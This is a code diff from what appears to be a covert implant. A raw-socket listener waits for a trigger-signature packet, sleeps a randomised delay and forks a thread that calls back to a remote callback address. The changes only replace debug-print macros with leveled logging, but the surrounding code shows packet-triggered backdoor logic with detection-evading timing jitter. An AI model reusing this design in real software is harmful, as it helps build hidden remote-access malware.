@@ -72,19 +72,19 @@ void CalcVariance( signed int* variance, int range )
 #if defined LINUX || defined SOLARIS
 	if ( havege_state_init != 1 )
 	{
-		D( printf( " . Initializing Havege State.\n" ); )
+		DLX(6, printf( "Initializing Havege State.\n"));
 		havege_init( &hs );
 		havege_state_init = 1;
 	}
 
 	*variance = ( havege_rand( &hs ) % range );
-	D( printf( " . CalcVariance() called. %i\n", *variance ); )
+	DLX(6, printf( "CalcVariance() called. %i\n", *variance));
 
 	return;
 #endif
 
 
-	D( printf( " . CalcVariance() called.\n" ); )
+	DLX(6, printf( "CalcVariance() called.\n"));
 
 	//first decide if it will be plus or minus
 	if( rand() > RAND_MAX / 2 )
@@ -112,12 +112,12 @@ void TriggerDelay(int trigger_delay)
 	unsigned int delay = 0;
 
 	CalcVariance( &variance, 30);
-	D( printf( " DEBUG: calculated variance %d\n", variance * 1000 ); )
+	DLX(4, printf("Calculated trigger deleay variance: %d seconds\n", variance * 1000));
 
 	calc_delay += trigger_delay + ( variance * 1000 );
 	delay = MAX( 1000, calc_delay ); 					// this creates a minimum value of 1 second
-	D( printf( " DEBUG: calculated trigger delay is %d.  Using %d.\n", calc_delay, delay ); )
-	D( printf( " DEBUG: preparing to sleep %d seconds.\n", delay / 1000 ); )
+	DLX(4, printf( "Calculated trigger delay is %d.  Using %d.\n", calc_delay, delay));
+	DLX(4, printf( "Preparing to sleep %d seconds.\n", delay / 1000));
 	Sleep( delay );
 //	Sleep( MAX(trigger_delay,(30 * 1000)) + (variance * 1000));
 
@@ -155,7 +155,7 @@ void* start_triggered_connect( void *param )
 //	dt_exec_payload( &( tParams.Payload ) );
 //	recvd_payload = &( tParams.Payload );
 
-	D( printf("%s, %4d: Preparing to exec...\n", __FILE__, __LINE__); )
+	DLX(4, printf("Preparing to exec...\n"));
 
 	// TODO: Fix this for Solaris
 #if 0
@@ -184,7 +184,7 @@ void* start_triggered_connect( void *param )
 		// this error should be handled differently than ignoring it.
 		if ( SHUTDOWN == TriggerCallbackSession(callback_address, tParams.callback_port) )
 		{
-			D( printf("%s, %4d\n", __FILE__, __LINE__); )
+			DL(4);
 			D( return(0); )
 			exit(0);
 		}
@@ -209,7 +209,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 	size_t 			packet_info_size = sizeof( packet_info);
 #endif
 
-	D( printf("%s, %4d:\n", __FILE__, __LINE__); )
+	DL(2);
 	// reap any CHILD processes that die, prevent zombies
 	// this is not needed because no processes are forked
 	signal( SIGCHLD, sigchld_reaper );
@@ -218,7 +218,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 
 	if( socket_fd == FAILURE )
 	{
-		D( printf("%s, %4d: Exiting, cannot create socket!\n", __FILE__, __LINE__); )
+		DLX(2, printf("Exiting, cannot create socket!\n"));
 		exit(-1);
 	}
 
@@ -239,7 +239,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 		if ( packet_length == FAILURE )
 		{
 			// not sure what to do upon recv error
-			D( printf(" ERROR: sniff_read_solaris() returned FAILURE\n"); )
+			DLX(5, printf(" ERROR: sniff_read_solaris() returned FAILURE\n"));
 			continue;
 		}
 
@@ -249,7 +249,7 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 				(struct sockaddr *) &packet_info, (socklen_t *) &packet_info_size ) )  == FAILURE )
 		{
 			// not sure what to do upon recv error
-			D( printf("%s, %4d: Error: recvfrom() failure!\n", __FILE__, __LINE__); )
+			DLX(4, printf("Error: recvfrom() failure!\n"));
 			continue;
 		}
 #endif
@@ -259,17 +259,17 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 			{
 				unsigned char	recvdKey[ID_KEY_HASH_SIZE];
 
-				D( printf( "%s, %4d: Trigger signature found, about to send call back (will wait for trigger_delay)\n", __FILE__, __LINE__); )
+				DLX(2, printf("Trigger signature found, about to send call back (will wait for trigger_delay)\n"));
 				// this memory is free'd in the thread
 				tParams = calloc( 1, sizeof( TriggerInfo ) );
 				if (tParams == NULL) {
-					D (printf( "%s, %4d: Calloc failed.", __FILE__, __LINE__);)
+					DLX(2, printf("Calloc failed."));
 					return FAILURE;
 				}
 
 				// Populate the structure with the parameters needed inside the thread.
 				if (payload_to_trigger_info(&recvd_payload, tParams) == FAILURE) {
-					D (printf( "%s, %4d: payload_to_trigger_info failed.\n", __FILE__, __LINE__);)
+					DLX(2, printf( "payload_to_trigger_info() failed.\n"));
 					free(tParams);
 					return FAILURE;
 				}
@@ -303,7 +303,6 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 #else
 				if ( fork_process( start_triggered_connect, (void *)tParams) != SUCCESS )
 				{
-					D( printf("%s, %4d: ERROR: Failed to create start_triggered_connect thread\n", __FILE__, __LINE__); )
 					if ( tParams != NULL ) free( tParams );
 					return FAILURE;
 				}
@@ -335,27 +334,26 @@ void sigchld_reaper (int x)
 
     pid = waitpid (-1, &waiter, WNOHANG);
 
-#ifdef DEBUG    
+DLX(5,
     switch (pid) {
       
     case -1:
-      printf("%s, %4d: [%ld] sigchld...no children\n", __FILE__, __LINE__, (long) getpid () );
+      printf("[%ld] sigchld...no children\n", (long) getpid () );
       break;
       
     case 0:	  
-      printf("%s, %4d: [%ld] sigchld...no dead kids\n", __FILE__, __LINE__, (long) getpid() );
+      printf("[%ld] sigchld...no dead kids\n", (long) getpid() );
       break;
 
     default:
-      printf("%s, %4d: [%ld] sigchld...pid #%ld died, stat=%d\n", __FILE__, __LINE__, (long) getpid (), (long) pid, WEXITSTATUS (waiter));
+      printf("[%ld] sigchld...pid #%ld died, stat=%d\n", (long) getpid (), (long) pid, WEXITSTATUS (waiter));
       break;
 
     }
-#endif
+);
 
   } while (pid > 0);
 
 	return;
 }
 #endif
-
